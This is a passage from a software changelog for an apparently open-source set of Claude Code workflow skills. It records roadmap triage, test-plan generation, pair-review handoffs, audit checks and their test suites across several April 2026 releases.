- **Reopen rule.** Origin-tagged bug arrives for a `✓ Complete` Group: smart-default PROMPT based on severity + file overlap + bug age. IF critical → hotfix-for-Group-N; ELSE IF files overlap active Group's `_touches:_` → fold into active; ELSE → defer to Future.
- **Dedup pre-pass in Step 2a.** `hash(normalize_title(title))` groups identical bugs from different sources. Cross-source duplicates collapse to one item. Source tag preserved on the kept entry; log at `.context/roadmap/dedupe-log.jsonl` captures dropped source for traceability. User confirms every dedup.
- **Severity taxonomy in `/full-review`.** `critical | necessary | nice-to-have | edge-case` replaces `critical | important | minor`. Edge-case findings are DROPPED at source in Phase 2 — never written to TODOS.md. Triage prompt includes "Approve + reclassify severity" option for fine-tuning before persistence.
- **Defer nudge in `/pair-review`.** When a parked bug's "Send to TODOS.md" option fires, the prompt reframes toward closure: "Fix now keeps the Group closure tight. Defer only if it's truly cross-branch." "Fix now" listed first, default tilts toward on-branch resolution.
- **`scripts/test-source-tag.sh`** — 33-assertion unit test suite for the parser library. Grammar, normalization, dedup hash stability, validator reason codes, heading extractors.
- **19 new test cases in `scripts/test-roadmap-audit.sh`** (160 total, was 141): `complete_groups` (heading-embedded `✓ Complete` detection, `_GROUP_NAMES` stripping, TASK_LIST `complete=0|1` flag, chain topology), `in_flight_topo` (DAG runnable Groups, doc-order tiebreaker, blocked-by-incomplete-dep exclusion, empty-roadmap skip), `origin_stats` (numeric-group filter, per-group counts, missing-TODOS skip), `todo_format` (rich-format pass, legacy-bullet fail, unknown-source fail, injection reject, untagged permissiveness).

### Changed
- **Stable Group IDs — no renumbering on completion.** Previously `skills/roadmap.md:797-811` said "remove the Group and renumber subsequent groups." This is REVERSED. Completed Groups stay in place, marked `## Group N: Name ✓ Complete` in the heading (bolt pattern). Renumbering only at explicit canonical reset points (documented in ROADMAP.md header). Load-bearing for origin tags: `[pair-review:group=2,item=5]` must resolve to the same Group forever.
- **Audit excludes `✓ Complete` Groups from active counts.** `STRUCTURAL_FITNESS`, `IN_FLIGHT_GROUPS`, `ORIGIN_STATS` all filter out complete Groups. `TASK_LIST` keeps them as ground truth (for reorg rebuilds) with a new `complete=1` flag on every task; consumers decide whether to filter. Prevents reorg from silently dropping historical Groups.
- **`/roadmap` Execution Order section.** New top-level diagram in `skills/roadmap.md` documenting the step sequence for each mode. Critical triage/update ordering: Step 1 → Step 1.5 → Step 3.5 (freshness scan) → Step 2a (scrutiny) → Step 2b → Step 3 → Step 4. Freshness scan runs BEFORE scrutiny so stale items get cleaned before keep/kill prompts.
- **`check_unprocessed` counts `### ` heading entries, not `- ` bullets.** Previously counted child bullets as items (reporting 16 items in a 5-entry TODOS.md). Legacy bullet entries are now flagged by `TODO_FORMAT` as `MALFORMED_HEADING`; rewrites required. No bullet-format items currently exist in this repo (migrate-now policy).
- **`/pair-review` and `/test-plan` parked-bug writes use rich format with origin metadata.** `### [pair-review:group=<group-slug>,item=<item-index>] Title` + child bullets. The `group=<group-slug>` origin lets `/roadmap`'s closure bias fold bugs back into the Group that surfaced them. `group=pre-test` for bugs parked before testing begins.
- **`/full-review` and `/review-apparatus` writers emit rich format.** Single-line bullet entries replaced with `### [tag] Title` + Why/Effort/Context/Proposed fix child bullets. `/full-review` optionally embeds `files=<path>` in the tag when clustering preserves single-file routing.
- **`bin/roadmap-audit` sources `bin/lib/source-tag.sh`.** Canonical parser available to all checks; DRY'd out 6+ open-coded regex duplications across audit consumers.

### Why

CC-driven roadmapping defaulted to "add to backlog" — full-review findings landed as esoteric TODOs that never got scrutinized, pair-review bugs sent to TODOS.md lost their Group-of-origin context, and in-flight Groups shipped without the bugs they themselves surfaced getting fixed. This release inverts the default: scrutiny is a required gate in every triage, origin metadata preserves Group context across handoffs, the closure dashboard makes deferred debt visible every run, and Group IDs stay stable forever so origin tags don't rot. `/plan-ceo-review` produced 11 baseline + 4 expansion scope items, `/plan-eng-review` + two rounds of Codex outside-voice review surfaced 10 additional architectural gaps (TODOS.md format parser bug, DAG-aware in-flight topology, cross-source dedup, reopen semantics, blast radius spanning review-apparatus + test-plan writers, stale-Group-number hazard) that all folded into scope. 443 test assertions passing across 6 suites (source-tag 33, roadmap-audit 160, test-plan-e2e 43, skill-protocols 102, update 44, test-plan 61). Migration is a no-op on this repo — all 5 existing TODOS.md entries are already in rich format.

## [0.15.0] - 2026-04-21

### Added
- `/test-plan` — new skill. Group-scoped batched test-plan generator that composes with `/pair-review` as the execution engine, not a replacement. When you bug-bash a Group (1-4 Tracks landing together), you type `/test-plan run <group>`, and the skill harvests every CEO/eng/design review doc you ran during Track scoping, auto-detects any per-Track `/pair-review` artifacts (so you don't re-test what you already tested), extracts testable claims via an LLM prompt with a strict JSON contract, classifies automated/manual via a conservative heuristic (ambiguous defaults to manual), writes a `-test-plan-batch-*.md` file to `~/.gstack/projects/<slug>/` that `/qa-only` auto-picks-up as test-plan context, populates `.context/pair-review/session.yaml` with `plan_source: test-plan` and `groups/<group>.md` with curated manual items, archives any prior groups file on re-run (strict handoff, no merge), and drops into `/pair-review`'s Phase 2 execution loop. The bug-bash runs against ONE integrated build — the current branch/commit — not cross-branch; Track branches are provenance-only in the plan. v1 subcommands: `run` and `status`. Deferred to v2: `seed` (forward-plan cache), `retro` (post-bug-bash plan critique), per-item LLM automation.
- **Per-Track pair-review consumption (5 categories).** Phase 4 of `run` scans `.context/pair-review/` and archived `.context/pair-review-archived-*` dirs for any session matching a Track branch in the Group's manifest. **Skip** items marked PASSED (no retest). **Surface for user decision** items marked SKIPPED. **Surface as "Known Deferred"** items with Status: DEFERRED_TO_TODOS (not ignored — bugs already judged important to route). **Carry forward** items with Status: PARKED. **Flag as regression candidate ONLY** FAILED+FIXED items when the integrated build differs from the verified build (integrated build has other Track commits landed after the fix, or overlapping file changes) — not blunt re-addition.
- **Explicit Group→branch manifest.** First `/test-plan run` on a Group prompts the user for each Track's branch name (with best-guess inference from `git branch --all` against Track-name slugs), writes `~/.gstack/projects/<slug>/groups/<group-slug>/manifest.yaml` (schema 1), and reads the manifest on every subsequent invocation. Eliminates the "invented Group-to-branch mapping" issue — mapping is a load-bearing artifact, not guesswork.
- **Stable item IDs.** Deterministic sha256 of `<branch>|<source_doc_path>|<section_heading>|<normalized_description>`, truncated to 8 hex chars. Unblocks v2 retro (diff plan vs outcomes), makes re-run behavior debuggable, enables cross-session dedup. Embedded as `<!-- test-plan-id: <id> -->` comments under each item in `groups/<g>.md` so `/pair-review` preserves them for future retro.
- **Artifact file-format contract.** New `docs/designs/test-plan-artifact-contract.md` owns the spec: path conventions (`<user>-<branch>-test-plan-batch-<ts>.md` for batch plans matching `/qa-only`'s existing discovery glob; distinguished from `-eng-review-test-plan-` artifacts by subtype token), front-matter schema (required fields: schema, name, group, group_title, generated, generated_by, build_branch, build_commit, manifest, stats), 10 required section order, item-entry format (`[id] [tags...] <description>`), provenance tag taxonomy (7 canonical tags: `[from diff]`, `[from ceo-review: <file>]`, `[from eng-review: <file>]`, `[from design-review: <file>]`, `[from design-doc: <file>]`, `[from parked-bug: <branch>]`, `[retest-after-fix]`, `[regression-candidate]`), provenance index table spec, and consumer contracts for `/qa-only` (passive) and `/pair-review` (active). Schema version 1 introduced. Upstream skills follow THIS contract; breaking changes bump schema.
- **`scripts/test-test-plan.sh`** — 58-assertion deterministic bash harness. Tests: slugify pipeline (6 assertions across realistic Group titles), stable item IDs (determinism, case + whitespace normalization, branch-variance, doc-path-variance, diff-item determinism), path construction (batch file matches `/qa-only` glob, manifest canonical shape, disambiguation from eng-review artifacts), archive behavior (preserves old content, fresh file replaces, multiple generations coexist), state-write failure guard (per /plan-eng-review failure mode #4: write to read-only dir fails cleanly + skill documents the guard), classification heuristic table coverage (8 automated signals + 6 manual signals + conservative-default rule), subcommand contract (run + status documented; seed + retro explicitly marked v2), provenance tag taxonomy (contract doc exists and declares all 8 tags), consume-category coverage (all 5 in Phase 4 + refinements), single-deploy-target guard (Phase 0 integrated-build confirmation documented).
- **`scripts/test-test-plan-extractor.sh`** — 21-assertion contract test + golden-set scoring harness. Contract check: required output fields (description, source_type, rationale_quote, section_heading, classification_signal), required source_types (ceo-review, eng-review, design-review, design-doc), required extraction rules (extract-every-claim, testable, rationale-verbatim, no-intra-doc-duplicates, JSON-only output), retry-on-invalid-JSON, worked example. Golden-set: 2 real gstack-extend design docs with 10 hand-labeled expected items (fuzzy keyword sets). Scoring subcommand (`--score <json>`) accepts an actual extractor-output JSON produced in a live Claude session, keyword-matches each expected item at ≥50% keyword presence, passes at ≥70% overall match. `--list-fixtures` subcommand documents the workflow. Non-blocking in contract mode if fixtures are missing (golden-set only needed for `--score`).
- **`scripts/test-test-plan-e2e.sh`** — 43-assertion end-to-end integration test. Stands up a full fixture scenario: git-init'd repo with `docs/ROADMAP.md` containing Group + 3 Tracks (including a bug-bash Track), 3 fixture review docs in a mock `~/.gstack/projects/<slug>/` project store spanning ceo-plan, eng-review, and design-review subtypes, 1 in-repo `docs/designs/widget-api.md`, and a full `.context/pair-review-archived-<ts>/` directory containing a prior session for one Track branch with all 5 status categories represented (PASSED, FAILED, SKIPPED, FAILED+FIXED, PARKED + DEFERRED_TO_TODOS in parked-bugs.md). Exercises: ROADMAP parsing, Group slugification to `widget-pipeline`, review-doc discovery per Track branch with intra-Track dedup, manifest.yaml write + shape, prior-pair-review consumption across all 5 categories with branch-filter correctness (wrong-branch yields zero leakage), Phase 7 archive-then-write with canonical item-ID comment format, Phase 6 batch-plan write with all required front-matter fields + all 9 required sections (one `_none_` variant exercised), `/qa-only` glob compatibility (discovered via `*-test-plan-*.md`), TODOS.md Unprocessed append preserving existing entries, idempotence under re-run with timestamp separation, session.yaml handoff marker.
- **Plumbing.** `setup` registers `test-plan` alongside the other 4 skills. `scripts/test-skill-protocols.sh` extended from 4 to 5 skills (asserts all required protocol sections present: Completion Status Protocol, Escalation format, Confusion Protocol, GSTACK REVIEW REPORT with first-column header). `scripts/test-update.sh` asserts "Installed 5 skills" + a new symlink check for `test-plan`. CLAUDE.md skill routing rule added: "Batch test a Group, 'bug bash', 'test this release', 'plan the bug bash' → invoke test-plan with args 'run &lt;group&gt;'". README gains a table entry ("`/test-plan` — Group-scoped batched test plan (composes with /pair-review) — New") and a full skill section documenting subcommands, file format, and the updated documentation taxonomy row.

### Why
Running `/pair-review` on every single PR is tedious and produces redundant testing — the same flows get walked through on every diff. The user had a productive pair-review session that tested a coherent portion of the app in logical order and surfaced 10-20 bugs and TODOs; the goal of v0.15 is to make that shape a primitive. `/test-plan` is the composition skill that takes Group-level batching (aligns with how work is actually organized in ROADMAP.md) and hands off to the proven `/pair-review` execution engine. The 10x unlock is review-doc harvesting: CEO/eng/design reviews already ran during Track scoping, and turning their decisions into tagged test items means the bug-bash verifies "the things we explicitly cared about" instead of "whatever the human remembers to click." Design doc went through /office-hours (scope, review enrichment, runtime model, hybrid timing) and /plan-eng-review (5 Claude architecture issues, 3 code-quality issues, 28 test gaps → full v1 coverage, 0 perf issues, 11 Codex outside-voice findings with 6 substantive tensions resolved). Codex caught three architectural gaps the Claude review missed: cross-branch execution (pair-review is single-branch; v1 now enforces ONE integrated build), Group→branch mapping was invented (now explicit manifest), item identity was missing (now stable 8-char sha256 IDs). v1 surface cut from 4 subcommands to 2 after Codex flagged `seed` as speculative cache and `retro` as requiring identity work. User-initiated upgrade on test coverage: original recommendation was "defer E2E to v2"; user pushed back, boiled the lake — full v1 coverage (bash + extractor golden-set + E2E, 122 total assertions across three harnesses).

## [0.14.0] - 2026-04-20

### Added
- `/roadmap` supports optional **Group-level `_Depends on:_`** annotations so projects with parallel workstreams can express a DAG instead of a single linear chain. Syntax: `_Depends on: Group 9 (Core App Ready), Group 10_` on the italic line immediately after a Group heading. Default (no annotation) = depends on the immediately preceding Group — backward compatible, every existing roadmap still validates. `_Depends on: none_` (or `—`) marks a Group as parallel-safe with no deps.
- New **`## GROUP_DEPS` audit section** in `bin/roadmap-audit`. Parses annotations, builds the DAG, runs Kahn's cycle detection, validates forward references, and emits **`STALE_DEPS` warn** when a name-anchored ref (`Group N (Name)`) has drifted from the current heading. Always emits a topologically-ordered adjacency list (`- Group 13 ← {9, 12}`) regardless of STATUS — this is the useful artifact.
- New **`STYLE_LINT` rule: redundant backwards-adjacent deps** warns when an explicit `Depends on: Group N` duplicates the implicit default (preceding Group). Keeps annotations semantically meaningful.
- 18 new test cases in `scripts/test-roadmap-audit.sh`: default linear chain, explicit `none`, em-dash as none, single/multi-ref, name-anchor match/drift, cycle detection, forward-ref failure, redundant-backwards-adjacent warn, non-redundant ref, backward compat with no annotations, adjacency list always-emitted, empty roadmap skip, own ROADMAP.md regression, Group 1 alone, implicit-default cycle, name-anchor with spaces. 141 tests total (123 existing + 18 new), 0 failures.

### Changed
- `skills/roadmap.md` **Rule 1 reframed**: "A Group is a wave of PRs that land together — parallel-safe within, **dependency-ordered** between." Default remains single linear chain; the DAG is opt-in via annotation.
- New **Rule 3a** documents Group-level `_Depends on:_` syntax, defaults, name anchoring, and the redundant-annotation lint.
- Output Template updated: Execution Map leads with the **adjacency list** (the always-useful artifact) and keeps the track-detail tree below.
- **Step 3.5d (renumber pass)** extended: when a Group is deleted, all Group-level `_Depends on: Group N_` references must be updated (and name anchors refreshed to the renumbered Group's current heading). Explicitly called out as a "boringly thorough" guarantee — the renumber pass is the structural replacement for a concurrent-edit orchestration guard (single-writer architecture + thorough renumber = downstream readers always see consistent numeric refs).
- `Interpreting audit findings` in `skills/roadmap.md` gains entries for the new `GROUP_DEPS: fail/warn` statuses and the new redundant-backwards-adjacent `STYLE_LINT` warning.

### Why
The design plan assumed a single linear chain of Groups. Real case from Bolt v0.9.22.x: a CLI workstream (MCP server reading read-only SQLite) needs to run parallel with ongoing Swift-side core-app work — the CLI's Layer 1 has zero file overlap with current Groups, and Layers 2-3 depend on a later core-app Group. The only current escape hatch was two ROADMAP files, splitting `/roadmap` drainage and PROGRESS.md tracking. Group-level deps let one ROADMAP.md express the DAG cleanly. Scope converged after a codex outside-voice review: **rejected** Streams as a first-class primitive (premature with sample size of 1 project), **rejected** `/pair-review --stream/--groups` flag (pair-review's "groups" are an unrelated test-session concept — naming collision), **rejected** swim-lane ASCII Execution Map render (the adjacency list carries all the information without the failure surface). **Kept** name-anchored refs (user's explicit judgment: rename safety worth the churn). See `~/.gstack/projects/kbitz-gstack-extend/ceo-plans/2026-04-20-roadmap-group-deps.md` for the full decision trail.

## [0.13.0] - 2026-04-18

### Added
- `/review-apparatus` — new skill that audits a project's testing and debugging apparatus. Reads existing scripts, `bin/` tools, Makefile targets, dev endpoints, logging, staging configs, and test infra. Proposes lightweight bolt-on additions where a small helper would make CC-assisted verification or debugging materially easier. Approved proposals land in `docs/TODOS.md` as `[review-apparatus]` items for `/roadmap` to organize.
- `/roadmap` source-tag signal list now includes `[review-apparatus]` with classification guidance (tooling proposals classify by which code area they support, or form a platform/tooling track when several accumulate). `[review-apparatus]` added to the canonical provenance tag list alongside `[pair-review]`, `[manual]`, `[investigate]`, `[full-review]`, `[discovered:<filepath>]`.
- `scripts/test-skill-protocols.sh` extended to cover the new skill (62 → 82 assertions). Each of the four skills must now contain all three protocol sections plus the REPORT table.
- `scripts/test-update.sh` extended with a symlink check for `review-apparatus` and updated `Installed 3 skills` → `Installed 4 skills` assertion.
- README updated with a `/review-apparatus` table entry and a full skill section describing the audit + proposal flow.

### Why
The concrete itch came from Bolt: during manual testing of email compose/send/store, the user wants CC to verify that the editor HTML, the sent payload, and the stored row all match. That is not work pair-review can do today, because the projects being tested lack the dev-time hooks CC would need (direct DB access, last-sent readers, editor HTML dumps). The load-bearing reframe: most projects don't have the apparatus that would let ANY gstack skill do CC-assisted verification. /review-apparatus fills the producer side of that equation. pair-review, /qa, /investigate, and /full-review will pick up the apparatus organically once it exists in a project. How they discover and invoke it is a future, separate design. Design doc: `~/.gstack/projects/kbitz-gstack-extend/kb-kbitz-pair-review-assist-design-20260418-113742.md`.

## [0.12.0] - 2026-04-18

### Added
- GSTACK REVIEW REPORT table rendering in `/pair-review`, `/roadmap`, and `/full-review`. Each skill now leads its end-of-run output with a dashboard table (Review/Group | Trigger | Why | Runs | Status | Findings) plus a one-line verdict mapped from the Completion Status Protocol enum.
- `/full-review` prepends the table to the top of `.context/full-review/report.md` and emits it in the chat response. Narrative clusters stay below.
- `/roadmap` leads every run's summary with the table, above the deterministic audit sections (`## MODE`, `## VOCAB_LINT`, etc.). Table counts blockers vs advisories from the audit output.
- `/pair-review` emits a per-group mini-table at each group checkpoint (single-row rollup of that group's state) AND a session-done rollup with one row per group. The per-group table keeps the Conductor action-receipt pattern clean; the rollup is the final dashboard.
- `scripts/test-skill-protocols.sh` extended from 36 to 62 assertions: each skill must contain the REPORT table template, column headers (Trigger/Why/Runs/Status/Findings plus either Review or Group as first column), and the VERDICT line. pair-review additionally verified for both per-group and session-done templates.

### Why
Third and final PR in the gstack-parity sequence. Closes the "feels different from gstack" gap: every skill now surfaces a predictable dashboard at its most visible output point, plus a verdict line driven by the same status enum introduced in v0.11. Three PRs, zero behavior change to the skills' main flows, ~600 lines total added across skills + tests. See `~/.gstack/projects/kbitz-gstack-extend/kb-kbitz-gstack-patterns-design-20260418-105937.md`.

## [0.11.0] - 2026-04-18

### Added
- Completion Status Protocol grafted into `/pair-review`, `/roadmap`, and `/full-review`. Every session now rolls up to one of `DONE` / `DONE_WITH_CONCERNS` / `BLOCKED` / `NEEDS_CONTEXT` with per-skill rollup rules (pair-review maps per-item states, roadmap maps audit findings, full-review maps agent outcomes + phase state).
- Escalation format block in each skill. 3-attempt rule, security gate, scope-exceeds-verification gate. Standard STATUS/REASON/ATTEMPTED/RECOMMENDATION shape.
- Confusion Protocol block in each skill. Stop-and-ask gate for high-stakes ambiguity, with per-skill example ambiguities (e.g., pair-review "reset" scope; roadmap PARALLEL collision merge; full-review cluster framing).
- `scripts/test-skill-protocols.sh`: 36 grep-based assertions across the three skills. Verifies each contains Completion Status Protocol, Escalation subsection, Confusion Protocol, all four status tokens, and all four escalation fields.

### Why
Second PR in the gstack-parity sequence. Before this, extend's three skills each used ad-hoc phase vocabulary for session state and had no standard escalation or ambiguity gate. That is the "feels different from gstack" friction. These three sections close most of it in one diff, without touching behavior. Same verbatim pattern as gstack core, adapted per-skill for the rollup rules. See `~/.gstack/projects/kbitz-gstack-extend/kb-kbitz-gstack-patterns-design-20260418-105937.md`.

## [0.10.0] - 2026-04-18

### Removed
- `/browse-native` skill and all supporting infrastructure. The beta never left beta, had zero known active users, and carried ongoing maintenance overhead (22KB implementation guide, inside-out debug pattern, three validation gates) for no shipping value. Deleted `skills/browse-native.md`, `docs/debug-infrastructure-guide.md`, and `scripts/validate.sh` (which only ran the browse-native gates).
- `--with-native` flag from `setup`. Rejected as an unknown option now. `setup --uninstall` still iterates legacy `browse-native` symlinks for a clean upgrade path from pre-0.10.0 installs (removes its own symlinks, preserves foreign ones).

### Changed
- `README.md` skill table shrunk to the three shipping skills (`/pair-review`, `/roadmap`, `/full-review`). Beta skills section and the full `/browse-native` section removed.
- `CLAUDE.md` testing line switched from the now-deleted `validate.sh` to the generic `scripts/test-*.sh` pattern.
- `scripts/test-update.sh` now asserts `browse-native` is NOT installed, `--with-native` is rejected, and uninstall leaves foreign `browse-native` symlinks alone (the cleanup path for legitimate pre-0.10 symlinks is preserved in code but not positively tested, since constructing that state post-deletion would defeat PR 1).

### Why
First step in a three-PR sequence that grafts gstack's consistency patterns (Completion Status Protocol, Confusion Protocol, GSTACK REVIEW REPORT table) into extend's three daily-use skills. Dropping an unused beta keeps the parity work scoped and maintenance-free. See `~/.gstack/projects/kbitz-gstack-extend/kb-kbitz-gstack-patterns-design-20260418-105937.md` for the full design + eng review (7 issues resolved, 3/3 Lake Score).

## [0.9.0] - 2026-04-18

### Added
- `/roadmap` now enforces per-Track size caps (`max_tasks_per_track=5`, `max_loc_per_track=300`, `max_files_per_track=8`, `max_tracks_per_group=8`). Ceilings are tunable via `bin/config`; effort labels `(S/M/L/XL)` map to seed LOC (50/150/300/500). A track exceeding any cap is a `## SIZE` audit blocker.
- Every track gains a dedicated `_touches:_` metadata line enumerating its full file footprint. The audit uses it to compute pairwise `## COLLISIONS` within each Group. Collisions are classified **SHARED_INFRA** (overlap in `docs/shared-infra.txt` — fix: promote to per-Group Pre-flight) or **PARALLEL** (fix: merge tracks or move one to next Group). Legacy tracks without `_touches:_` are tolerated (`LEGACY_TRACKS` banner + `skip-legacy` status) and trigger a migration prompt on next `/roadmap` run.
- `## STYLE_LINT` warns (non-blocking) when a track uses `Depends on: Track NA` to reference another track in the same Group — "blocks → next Group" is a rule, not an annotation.
- `## SIZE_LABEL_MISMATCH` warns when a task's declared `~N lines` hint diverges from its effort tier's LOC mapping by more than 3x.
- New `bin/lib/effort.sh` library: deterministic LOC mapping, ceiling resolution (env var > `bin/config` > default), numeric validation on config overrides (non-numeric values fall through to default with a `CONFIG_INVALID` warning).
- New `docs/shared-infra.txt` (per-project): hand-curated list of files where two parallel tracks overlapping is always a SHARED_INFRA collision. Supports `*` globs, `{a,b}` brace expansion, and `#` comments. Loaded once per audit run via `find -path`.
- 34 new test cases in `scripts/test-roadmap-audit.sh` covering size caps (happy path + every failure axis + env overrides + non-numeric), collisions (disjoint/PARALLEL/SHARED_INFRA/cross-Group-excluded/legacy-excluded), shared-infra glob (literal/`*`/brace/comments), style lint, touches parsing (whitespace/wrong order), max-tracks-per-Group, and a load-bearing regression assertion that the repo's own migrated `docs/ROADMAP.md` passes the full audit.

### Changed
- `skills/roadmap.md` Rule 1 reframed: "A Group is a wave of PRs that land together — parallel-safe within, sequential between. Create a new Group whenever dependency ordering demands it OR parallel tasks would collide on files." Kept the existing "Group" vocabulary (no rename) to preserve freshness-scan provenance lookups and existing user docs.
- `bin/roadmap-audit` `check_structure()` now detects `_touches:_` appearing before the italic metadata line and emits a clear error (previously misreported as "missing risk level").
- `docs/ROADMAP.md` migrated to the new two-line metadata format. Track 1B deleted (all tasks were shared-infra → moved to Group 1 Pre-flight); Track 1A flattened to its only non-shared-infra task.

### Why
Two recurring failure modes of `/roadmap`: tracks too big for a single PR (get split mid-implementation) and "parallel" tracks that actually conflict (shared-infra files not modeled). The skill now enforces size as a hard invariant and computes collisions from explicit `_touches:_` sets instead of relying on informal "primary files" vibes. See `~/.gstack/projects/kbitz-gstack-extend/ceo-plans/2026-04-18-roadmap-track-sizing.md` for the full decision trail (3 adversarial review rounds, score 8.0/10).

## [0.8.11] - 2026-04-16

### Fixed
- Freshness scan in `/roadmap` now only considers commits made AFTER a task was introduced. Previously, `--since="4 weeks ago"` credited old commits as potential fixes for recently-added TODOs, producing false positives. Now uses `git log -S` to find each task's introduction date, then filters with `--after`.
- Step 2a (Keep or Kill) now has an explicit, date-guarded file-activity check instead of relying on ad-hoc LLM behavior.
- Freshness scan display shows "since introduced (date)" instead of "in last N weeks" so you can see the temporal anchor.

## [0.8.10] - 2026-04-15

### Added
- GitHub Action (`auto-tag.yml`) to create git tags automatically when VERSION changes on merge to main. Idempotent: skips if tag already exists.
- Update-check and 4-digit version tests in `test-update.sh`: semver comparisons, regex validation, upgrade detection with MICRO versions.
- Versioning section in README defining MAJOR.MINOR.PATCH.MICRO semantics.

### Changed
- Version validation regex in `bin/update-check` tightened from `^[0-9]+\.[0-9.]+$` to `^[0-9]+\.[0-9]+\.[0-9]+(\.[0-9]+)?$`. Now rejects malformed versions (double dots, trailing dots, 5+ segments) while accepting X.Y.Z and X.Y.Z.W.

### Fixed
- Added gist bridge comment in `bin/update-check` documenting why the old gist URL (pre-0.8.8.1) must be kept alive as a permanent upgrade bridge.
- `bin/roadmap-audit`: replaced bash 4+ associative arrays (`declare -A`, `local -A`) with bash 3-compatible helpers. The old code crashed on stock macOS (bash 3.2), silently skipping `check_unprocessed()` and `check_mode()`. Fixed 3 pre-existing test failures.
- `scripts/test-update.sh`: updated setup test expectations from 2 to 3 default skills (full-review was added in v0.8.0 but test wasn't updated). Fixed 2 pre-existing test failures.

## [0.8.9.0] - 2026-04-14

### Changed
- Roadmap audit now accepts 4-digit versions (`X.Y.Z.W`). The MICRO segment enables finer-grained bumps for doc-only and config changes. Previously, any 4-digit version was flagged as invalid SemVer.

## [0.8.8.1] - 2026-04-14

### Added
- MIT LICENSE file for open source distribution.

### Changed
- Update check now uses `raw.githubusercontent.com` instead of private gist for version lookups.
- README clone URL switched from SSH to HTTPS for public accessibility.
- Anonymized internal project references in design docs and implementation guide.

### Removed
- Gist sync GitHub Action (`.github/workflows/sync-version.yml`) — no longer needed with raw GitHub URL.
- Archived design docs (`docs/archive/`) containing internal project references.

## [0.8.8] - 2026-04-13

### Changed
- /roadmap triage mode now runs the freshness scan (Step 3.5) before classifying items into groups. Previously, triage slotted new items into potentially-complete groups because the freshness scan was gated to `/roadmap update` only. Now stale/completed tasks are always cleaned before new items get placed.
- Triage mode no longer exits early when the Unprocessed section is empty if stale items need cleaning. The freshness scan runs first, then exits if nothing was found.
- Update mode pipeline order corrected: audit → freshness scan → triage (was audit → triage → freshness scan).

## [0.8.7] - 2026-04-12

### Added
- Lookahead display in /pair-review Phase 2: every test item now shows a preview of the next item inline (_Next up: N+1. description_), so the user can start testing it immediately while waiting for the agent to process. Reduces perceived wait time to near zero.
- Batch mode for /pair-review: "Batch: next 3" option presents 3 items at once with "All pass" / "Report results" responses. Cuts round-trips by 3x for rapid testing sessions. Natural language triggers: "batch", "faster", "speed up".
- Fast path optimization for PASS/SKIP: agent uses cached lookahead data and parallelizes state writes (group file + session.yaml in same turn), avoiding unnecessary re-reads between items.

## [0.8.6] - 2026-04-11

### Added
- Structural assessment step (Step 3-pre) for triage and update modes: before classifying new items into existing Groups/Tracks, the skill now steps back and assesses whether the structure still fits. Offers full reorganization when drift is detected.
- Post-freshness-scan structural assessment (Step 3.5f): after removing completed tasks, checks if remaining structure is lopsided or broken.
- Deterministic task extraction (`check_task_list()` in audit script): parses ROADMAP.md into structured TASK lines so reorg uses a reliable task inventory instead of LLM-based extraction.
- Structural fitness metrics (`check_structural_fitness()` in audit script): computes group/track sizes and imbalance ratio as concrete signals for the structural assessment.
- Future item re-triage during reorganization: when structural reorganization is approved, Future items are re-evaluated for current-phase promotion.
- Mode-aware skip instruction after reorg: triage skips to Step 4, update proceeds to freshness scan.
- Reorg-specific commit messages distinguishing structural reorganization from plain triage.
- 15 new audit tests (84 total) covering task list parsing and structural fitness computation.

### Fixed
- Keep/kill step (Step 2a) clarified as overhaul-mode-only. Resolves pre-existing contradiction where triage mode was described as running keep/kill in one place and skipping it in another.

## [0.8.5] - 2026-04-10

### Added
- `/roadmap update` subcommand: incremental refresh mode that processes new unprocessed items, scans ROADMAP.md tasks against git reality for completed and unblocked work, and updates PROGRESS.md. Never exits early when the Unprocessed section is empty.
- Freshness scan (Step 3.5): detects potentially completed tasks via recent git commits on referenced files, detects unblocked tasks when blocker conditions resolve, presents findings for user confirmation before modifying ROADMAP.md.
- Mode-specific commit messages for overhaul, triage, and update modes.
- 4 new tests for PROGRESS_LATEST version parsing (69 total).

### Fixed
- PROGRESS_LATEST parsing bug: was using `head -1` which returned the first table row regardless of order. Now uses semver comparison to find the highest version, independent of table ordering.
- Four-segment versions (invalid SemVer) in PROGRESS.md are now excluded from PROGRESS_LATEST output while still being flagged as lint findings.

## [0.8.4] - 2026-04-07

### Added
- Full doc discovery in `/roadmap`: scans all .md files for scattered TODOs (checkboxes, TODO:/FIXME:/HACK:/XXX: markers, section headings, effort markers), extracts actionable items, deduplicates against existing TODOS.md/ROADMAP.md, and merges confirmed items with `[discovered:<filepath>]` provenance tags.
- Doc reclassification offers: after extracting TODOs from a file like plan.md, offers to rewrite the remaining content as a properly-named spec in docs/designs/, delete just the TODO sections, or leave as-is with drift detection.
- Doc inventory audit check: lists all .md files with TODO-pattern counts and doc type classification.
- Scattered TODOs audit check: flags non-standard .md files containing TODO-like patterns.
- Shared `find_scannable_md_files()` helper with proper exclusion list (known docs, archive, .context, node_modules, vendor).
- `count_todo_patterns()` with fenced code block exclusion supporting both backtick and tilde fences, including nested fence handling.
- 17 new tests for doc discovery checks (65 total).

## [0.8.3] - 2026-04-06

### Added
- Opinionated doc location check in `/roadmap` audit: root docs (README, CHANGELOG, CLAUDE.md, VERSION, LICENSE) stay in root, everything else (TODOS, ROADMAP, PROGRESS, designs, archive) belongs in docs/. Flags misplaced files as advisory findings. Suggests creating docs/ when it doesn't exist.
- Archive candidate detection: flags design docs in `docs/designs/` that reference a shipped version (version <= current VERSION) as candidates for archiving to `docs/archive/`.
- `semver_lte()` function in shared semver library for version comparison.
- 12 new tests for doc location and archive candidate checks (48 total).

### Changed
- Documentation Taxonomy table now includes a Location column showing where each doc should live.
- Duplicate doc detection messages updated from "pick one location" to "should be in docs/ only" for consistency with new location opinions.

## [0.8.2] - 2026-04-06

### Changed
- `/roadmap` triage now presents each TODO one-by-one instead of clustering by area. Each item gets its own AskUserQuestion with full description and git provenance (when introduced, which PR). Removes smart batching logic that forced extra round-trips to drill into clusters.

## [0.8.1] - 2026-04-06

### Changed
- Fixed invalid four-segment version 0.4.1.1 → removed (folded into 0.4.1).

### Added
- Phase-aware triage step in `/roadmap` (new Step 2 between audit and restructuring). Keep/kill decisions with auto-suggest kills (stale file refs, missed DONE markers), smart batching by area, and phase assignment (current vs future) before Group/Track structuring.
- `## Future` section in ROADMAP.md for items deferred to a future phase. Not organized into Groups/Tracks, just a flat list with deferral reasons.
- Phase header on ROADMAP.md title (`# Roadmap — Phase N (vX.x)`).
- Contextual vocabulary lint: "Phase" reclaimed for top-level scoping (title, Future section) while remaining banned inside Group/Track sections. State machine in `check_vocab_lint()` with whitelist approach.
